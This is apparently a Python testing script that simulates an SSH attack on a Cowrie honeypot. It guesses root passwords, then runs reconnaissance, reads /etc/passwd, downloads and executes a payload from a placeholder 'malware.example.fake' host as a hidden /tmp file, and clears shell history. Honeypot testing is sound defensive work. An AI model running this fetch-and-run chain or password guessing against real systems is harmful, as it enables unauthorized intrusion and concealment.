#!/usr/bin/env python3
import paramiko
import time
import sys
import yaml
import argparse
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
CONFIG_PATH = REPO_ROOT / "config.yml"

# Keep username and port specific to this script (do NOT pull from config.yml)
DEFAULT_USERNAME = "root"
DEFAULT_PORT = 22

# Fake malware URLs (harmless placeholders)
MALWARE_URLS = [
    "http://malware.example.fake/bot.sh",
]

def load_ip_from_config():
    if not CONFIG_PATH.exists():
        return None
    try:
        with open(CONFIG_PATH, "r") as f:
            cfg = yaml.safe_load(f) or {}
    except Exception:
        return None

    targets = cfg.get("targets")
    if isinstance(targets, list) and len(targets) > 0:
        first = targets[0]
        if isinstance(first, dict):
            return first.get("ip") or first.get("host") or first.get("address")
        else:
            return str(first)
    return cfg.get("target") or cfg.get("host")

def run_ssh_commands(client):
    shell = client.invoke_shell()
    time.sleep(1)

    commands = [
        "uname -a",
        "id",
        "pwd",
        "cat /etc/issue",
        "df -h",
        "ps aux",
        "netstat -tuln",
        "ls -la /tmp/",
        "cat /etc/passwd | grep -v nologin",
        "wget " + MALWARE_URLS[0] + " -O /tmp/.updater || true",
        "chmod +x /tmp/.updater || true",
        "/tmp/.updater &",
        "rm -f /tmp/.updater || true",
        "history -c",
        "exit"
    ]

    for cmd in commands:
        shell.send(cmd + "\n")
        time.sleep(1.5)

    output = ""
    while shell.recv_ready():
        output += shell.recv(1024).decode('utf-8', errors='ignore')
    if output:
        print("[+] Output (debug):")
        print(output)

def simulate_attack(config):
    try:
        client1 = paramiko.SSHClient()
        client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client1.connect(config["ip"], port=config["port"], username=config["username"], password="password123", timeout=10)
        client1.close()
    except Exception as e:
        print("[*] First login failed as expected:", str(e))

    time.sleep(2)

    try:
        client2 = paramiko.SSHClient()
        client2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client2.connect(config["ip"], port=config["port"], username=config["username"], password="letmein", timeout=10)
        print("[+] Second login 'successful' – running post-exploit commands...")
        run_ssh_commands(client2)
        client2.close()
    except Exception as e:
        print("[!] Second login failed:", str(e))
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate SSH brute/interaction against honeypot. Username/port are script-specific.")
    parser.add_argument("target", nargs="?", help="IP address (optional). If omitted, first entry in config.yml targets: is used.")
    parser.add_argument("-u", "--user", default=DEFAULT_USERNAME, help="Username to use (default kept local to this script).")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="Port to use (default kept local to this script).")
    args = parser.parse_args()

    ip = None
    if args.target:
        ip = args.target.strip()
    else:
        ip = load_ip_from_config()

    ip = ip or "127.0.0.1"
    cfg = {"ip": ip, "port": args.port, "username": args.user}

    print("[*] Simulating realistic SSH attack against Cowrie honeypot...")
    print(f"[*] Target: {cfg['ip']}:{cfg['port']} user={cfg['username']}")
    simulate_attack(cfg)
    print("[*] Attack simulation complete.")